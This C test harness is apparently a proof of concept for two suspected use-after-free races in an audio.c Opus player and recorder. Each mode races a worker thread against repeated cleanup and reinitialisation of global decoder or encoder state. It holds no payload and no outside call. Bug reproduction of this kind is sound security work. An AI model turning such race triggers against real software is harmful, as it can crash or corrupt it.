#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>

// Include the original audio.c
#include "audio.c"

// ---------------------- Mock helpers ----------------------
static char temp_opus_file[] = "/tmp/test_uaf.opus";

// ---------------------- Decoder UAF test (Candidate #1) ----------------------
static volatile int run_decoder = 1;
static void* thread_decoder_worker(void* arg)
{
    (void)arg;
    uint8_t buf[4096];
    while(run_decoder)
    {
        fillBuffer(buf, sizeof(buf));
        usleep(800);
    }
    return NULL;
}

static int run_decoder_uaf(void)
{
    printf("=== Running Decoder UAF PoC (_opusFile race) ===\n");
    initPlayer(temp_opus_file);

    pthread_t th;
    pthread_create(&th, NULL, thread_decoder_worker, NULL);

    for(int i=0;i<30000;i++)
    {
        cleanupPlayer();
        usleep(400);
        initPlayer(temp_opus_file);
        usleep(400);
    }

    run_decoder = 0;
    pthread_join(th,NULL);
    cleanupPlayer();
    return 0;
}

// ---------------------- Recorder UAF test (Candidate #2) ----------------------
static volatile int run_recorder = 1;
static void* thread_recorder_worker(void* arg)
{
    (void)arg;
    uint8_t pcm[1920];
    memset(pcm,0,sizeof(pcm));
    while(run_recorder)
    {
        writeFrame(pcm, sizeof(pcm));
        usleep(800);
    }
    return NULL;
}

static int run_recorder_uaf(void)
{
    printf("=== Running Recorder UAF PoC (_encoder global state race) ===\n");
    initRecorder(temp_opus_file);

    pthread_t th;
    pthread_create(&th, NULL, thread_recorder_worker, NULL);

    for(int i=0;i<30000;i++)
    {
        cleanupRecorder();
        usleep(400);
        initRecorder(temp_opus_file);
        usleep(400);
    }

    run_recorder = 0;
    pthread_join(th,NULL);
    cleanupRecorder();
    return 0;
}

int main(int argc, char** argv)
{
    if(argc <2)
    {
        fprintf(stderr,"Usage:\n  %s --decoder-uaf\n  %s --recorder-uaf\n",argv[0],argv[0]);
        return 1;
    }
    if(0==strcmp(argv[1],"--decoder-uaf"))
    {
        return run_decoder_uaf();
    }
    else if(0==strcmp(argv[1],"--recorder-uaf"))
    {
        return run_recorder_uaf();
    }
    else
    {
        fprintf(stderr,"bad argument\n");
        return 1;
    }
}

